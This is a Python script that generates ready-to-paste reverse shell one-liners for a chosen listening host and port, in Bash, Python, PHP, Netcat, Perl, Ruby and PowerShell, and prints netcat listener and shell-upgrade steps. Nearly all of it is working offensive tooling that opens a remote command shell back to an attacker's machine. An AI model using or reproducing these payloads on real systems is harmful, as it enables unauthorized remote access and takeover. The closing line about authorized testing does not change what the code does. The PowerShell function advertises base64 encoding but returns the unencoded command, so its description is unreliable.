#!/usr/bin/env python3

"""
Reverse Shell Generator
Description: Multi-language reverse shell payload generator
Author: AlperKurtulus (TheJker)
Usage: python3 revshell_generator.py

Features:
    - Multiple language support (Bash, Python, PHP, Netcat, etc.)
    - PowerShell with base64 encoding
    - Color-coded output
    - Copy-ready payloads
    - Listener setup instructions

Requirements: Python 3.6+
"""

import sys
import base64
from typing import Dict

# ANSI color codes
class Colors:
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[0;34m'
    PURPLE = '\033[0;35m'
    CYAN = '\033[0;36m'
    WHITE = '\033[1;37m'
    NC = '\033[0m'  # No Color

def print_banner():
    """Display script banner"""
    banner = f"""
{Colors.CYAN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘         Reverse Shell Generator v1.0                      â•‘
â•‘              By: AlperKurtulus (TheJker)                  â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•{Colors.NC}
"""
    print(banner)

def print_section(title: str):
    """Print section header"""
    print(f"\n{Colors.PURPLE}[*]â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•{Colors.NC}")
    print(f"{Colors.PURPLE}[*] {title}{Colors.NC}")
    print(f"{Colors.PURPLE}[*]â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•{Colors.NC}\n")

def print_success(message: str):
    """Print success message"""
    print(f"{Colors.GREEN}[âœ“]{Colors.NC} {message}")

def print_info(message: str):
    """Print info message"""
    print(f"{Colors.BLUE}[INFO]{Colors.NC} {message}")

def print_warning(message: str):
    """Print warning message"""
    print(f"{Colors.YELLOW}[!]{Colors.NC} {message}")

def print_payload(name: str, payload: str):
    """Print payload with formatting"""
    print(f"\n{Colors.CYAN}â•â•â• {name} â•â•â•{Colors.NC}")
    print(f"{Colors.WHITE}{payload}{Colors.NC}")

def get_bash_reverse_shell(lhost: str, lport: str) -> str:
    """Generate Bash reverse shell"""
    return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"

def get_bash_reverse_shell_alt(lhost: str, lport: str) -> str:
    """Generate alternative Bash reverse shell"""
    return f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"

def get_python_reverse_shell(lhost: str, lport: str) -> str:
    """Generate Python reverse shell"""
    return f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""

def get_python3_reverse_shell(lhost: str, lport: str) -> str:
    """Generate Python3 reverse shell"""
    return f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'"""

def get_php_reverse_shell(lhost: str, lport: str) -> str:
    """Generate PHP reverse shell"""
    return f"""php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");'"""

def get_netcat_reverse_shell(lhost: str, lport: str) -> str:
    """Generate Netcat reverse shell"""
    return f"nc -e /bin/sh {lhost} {lport}"

def get_netcat_alt_reverse_shell(lhost: str, lport: str) -> str:
    """Generate alternative Netcat reverse shell (when -e is disabled)"""
    return f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"

def get_perl_reverse_shell(lhost: str, lport: str) -> str:
    """Generate Perl reverse shell"""
    return f"""perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'"""

def get_ruby_reverse_shell(lhost: str, lport: str) -> str:
    """Generate Ruby reverse shell"""
    return f"""ruby -rsocket -e'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""

def get_powershell_reverse_shell(lhost: str, lport: str) -> str:
    """Generate PowerShell reverse shell"""
    ps_command = f"""$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""
    return ps_command

def get_powershell_base64(lhost: str, lport: str) -> str:
    """Generate PowerShell reverse shell with base64 encoding"""
    ps_command = get_powershell_reverse_shell(lhost, lport)
    # Encode to UTF-16LE for PowerShell
    ps_encoded = base64.b64encode(ps_command.encode('utf-16le')).decode()
    return f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""

def get_java_reverse_shell(lhost: str, lport: str) -> str:
    """Generate Java reverse shell"""
    return f"""r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])
p.waitFor()"""

def display_listener_info(lport: str):
    """Display netcat listener setup instructions"""
    print_section("Listener Setup Instructions")
    print_info("Set up your listener before executing the reverse shell")
    print_payload("Netcat Listener", f"nc -lvnp {lport}")
    print_payload("Netcat Listener (alternative)", f"nc -lnvp {lport}")
    print_payload("Using rlwrap for better shell", f"rlwrap nc -lvnp {lport}")
    
    print(f"\n{Colors.YELLOW}Tip: Use rlwrap for command history and arrow keys support{Colors.NC}")

def display_upgrade_info():
    """Display shell upgrade instructions"""
    print_section("Shell Upgrade Instructions")
    print_info("After catching the shell, upgrade it to a fully interactive TTY")
    
    print_payload("Python PTY", "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
    print(f"{Colors.BLUE}Then press:{Colors.NC} Ctrl+Z")
    print_payload("Background and configure", "stty raw -echo; fg")
    print_payload("Set terminal", "export TERM=xterm")
    
    print(f"\n{Colors.YELLOW}Alternative using script command:{Colors.NC}")
    print_payload("Script method", "script /dev/null -c bash")

def main():
    """Main function"""
    print_banner()
    
    # Get user input
    print_section("Configuration")
    
    try:
        lhost = input(f"{Colors.CYAN}Enter your LHOST (listening IP): {Colors.NC}").strip()
        if not lhost:
            print_warning("LHOST cannot be empty")
            sys.exit(1)
        
        lport = input(f"{Colors.CYAN}Enter your LPORT (listening port): {Colors.NC}").strip()
        if not lport:
            print_warning("LPORT cannot be empty")
            sys.exit(1)
        
        # Validate port number
        try:
            port_num = int(lport)
            if port_num < 1 or port_num > 65535:
                print_warning("Port must be between 1 and 65535")
                sys.exit(1)
        except ValueError:
            print_warning("Invalid port number")
            sys.exit(1)
        
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[âœ—] Interrupted by user{Colors.NC}")
        sys.exit(1)
    
    print_success(f"Configuration set: {lhost}:{lport}")
    
    # Generate payloads
    print_section("Generated Reverse Shell Payloads")
    
    payloads = {
        "Bash Reverse Shell": get_bash_reverse_shell(lhost, lport),
        "Bash Reverse Shell (Alternative)": get_bash_reverse_shell_alt(lhost, lport),
        "Python Reverse Shell": get_python_reverse_shell(lhost, lport),
        "Python3 Reverse Shell": get_python3_reverse_shell(lhost, lport),
        "PHP Reverse Shell": get_php_reverse_shell(lhost, lport),
        "Netcat Reverse Shell": get_netcat_reverse_shell(lhost, lport),
        "Netcat Alternative (no -e)": get_netcat_alt_reverse_shell(lhost, lport),
        "Perl Reverse Shell": get_perl_reverse_shell(lhost, lport),
        "Ruby Reverse Shell": get_ruby_reverse_shell(lhost, lport),
        "PowerShell Reverse Shell": get_powershell_base64(lhost, lport),
    }
    
    for name, payload in payloads.items():
        print_payload(name, payload)
    
    # Display additional information
    display_listener_info(lport)
    display_upgrade_info()
    
    print_section("Security Reminder")
    print_warning("These payloads are for authorized penetration testing only")
    print_warning("Always obtain written permission before testing")
    print_warning("Unauthorized access to computer systems is illegal")
    
    print(f"\n{Colors.GREEN}Happy Hacking! ðŸŽ¯{Colors.NC}\n")

if __name__ == "__main__":
    main()
